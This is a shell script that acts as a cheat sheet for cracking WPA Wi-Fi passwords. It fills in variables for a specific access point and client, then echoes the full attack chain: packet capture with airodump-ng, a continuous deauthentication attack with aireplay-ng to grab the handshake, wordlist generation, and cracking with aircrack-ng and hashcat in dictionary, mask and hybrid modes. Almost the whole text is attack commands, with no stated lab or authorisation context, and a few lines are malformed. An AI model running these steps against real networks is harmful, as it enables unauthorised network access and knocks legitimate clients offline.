int="wlan0"
ssid="wifisc"
channel="1"
ap="00:1D:71:E0:85:10"
host="00:21:6A:70:03:D0"
output="wpa"
replay_src="replay_arp-0130-055822.cap"




clear

echo "----"
echo "rmmod r8187"
echo "modprobe r8187"
echo "rmmod r8187"
echo "rmmod /proc/modules"
echo "rmmod rtl8187"
echo "modprobe r8187"
echo "ifconfig wlan0 up"


echo "-----"
echo "## Capture Output:"	
echo "# dump"
echo "airodump-ng $int"
echo "airodump-ng -c $channel -w $output --bssid $ap $int"

echo "-----"
echo "## Desauth to dump handshake"
echo "aireplay-ng -0 0 -a $ap -c $host $int"

echo "-----"
echo "Finding the Four-way Handshake"
echo "If the deauthentication was successful, airodump-ng displays a notification of the captured"
echo "Under Wireshark : EAPoL x4"


echo "-----"
echo "Generate dictionary"
echo "./mutator -f wordlist.txt -o passwords.txt"

echo "-----"
echo "## Crack aircrack ( 8 character minimum for WPA):	 "
echo "aircrack-ng -e $ssid -w passwords.txt $output.cap"

echo "-----"
echo "##Crack Hashcat  (8 character minimum for WPA"

echo "Convert .cap to hccap : https://hashcat.net/cap2hccap/"
echo "$output.cap >> $output.hccap"
echo "or (under BT5)"
echo "wpaclean $output_clean.cap $output.cap"
echo "aircrack-ng $output_clean.cap -J $output.hccap"

echo "-----"
echo "cat dictionary_file | cudaHashcat-plus32.bin -m 2500 $output.hccap"

echo "----"
echo "combination of a dictionary file and character masking or just strict character masking (10 years ...)"
echo "cudaHashcat-plus32.bin -m 2500 -a 3 -1 ?l?d $output.hccap ?1?1?1?1?1?1?1?1?1"

echo "----"
echo "mixed dictionary-mask attack"
echo "cudaHashcat-plus32.bin -m 2500 -a 6 $output.hccap passwords.txt ?d?d"

echo "----"
echo "other (http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)"
echo "oclHashcat-plus64.exe -m 2500 -r rules/best64.rule $output.hccap rockyou.txt"
echo "http://hashcat.net/wiki/doku.php?id=rule_based_attack"
echo "http://hashcat.net/wiki/doku.php?id=cracking_wpawpa2"

